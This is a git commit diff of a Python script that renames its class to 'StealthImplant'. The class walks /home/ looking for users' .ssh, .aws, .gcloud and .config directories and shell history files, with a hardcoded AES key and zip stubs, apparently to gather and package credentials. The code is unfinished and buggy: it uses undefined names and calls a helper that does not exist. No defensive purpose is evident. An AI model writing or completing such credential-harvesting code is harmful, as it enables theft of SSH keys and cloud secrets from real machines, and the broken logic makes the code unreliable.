89f2ac4c34e0c076e29de17d350221a15ba958ee
Kalvin <kalvinliang123@gmail.com>
2025-05-10 17:42:20 -0400

    not reading file properly

--- tmp363.py
+++ tmp363.py
@@ -1,37 +1,53 @@
 from pathlib import Path
 import zipfile
 
-class Implant:
+class StealthImplant:
     
     # we scan from "source"
     # we look for file matching "target"
     def __init__(
         self, 
         source="/home/",
-        target=["~/.ssh/", "~/.config/", "~/.aws/", "~/.history"],
-        test=True
+        target_patterns=[
+            ".ssh", 
+            ".config", 
+            ".aws", 
+            ".gcloud",
+        ],
+        history_glob=".*_history",
+        test=False
     ):
         if test:
             print("Implant initialize")
             print("source", source)
             print("target", target)
 
-        self.root=Path(source)
-        self.target=target
-        self.file_path=[]
-        self.zip_file=[]
+        self.root_dir=Path(source)
+        self.target_patterns=target_patterns
+        self.history_glob=history_glob
         self.test=test
+        self.ignore_dirs = {"lost+found", "cache", "tmp" }
+        self.encryption_key = b'16bytessecretkey'  # AES-128
+        self.encryption_iv = b'16bytepubliciv!'
     
+    def run(self):
+        try:
+            collected_files=self.walk_dir()
+        except Exception as e:
+            if self.test:
+                raise
+
     # get list of file from source
     # matching target
     def walk_dir(self):
+        target = [] 
+        for user_dir in self.root_dir.iterdir():
+            if any((user_dir / marker).exists() for marker in self.target_patterns):
+                print("found", user_dir)
+                targets.extend(self._scan_user_dir(user_dir))
+        return targets
 
-        for file_path in self.root.rglob("*"):
-            self.file_path.append(file_path)
-            if self.test: print(f"Found file: {file_path}")
-            content=file_path.read_text()
-            if self.test: print("Content:", content)
-    
+        
     # zip the files we found
     def zipfile(self):
         pass
@@ -45,12 +61,13 @@ class Implant:
         pass
 
 def main():
-    implant = Implant(source="test_data")
-    implant.walk_dir()
-    print(implant.file_path)
+    implant = StealthImplant(source="test_data", target_patterns=[".txt"])
+    implant.run()
 
 if __name__ == "__main__":
     main()
+
+
 
 
 
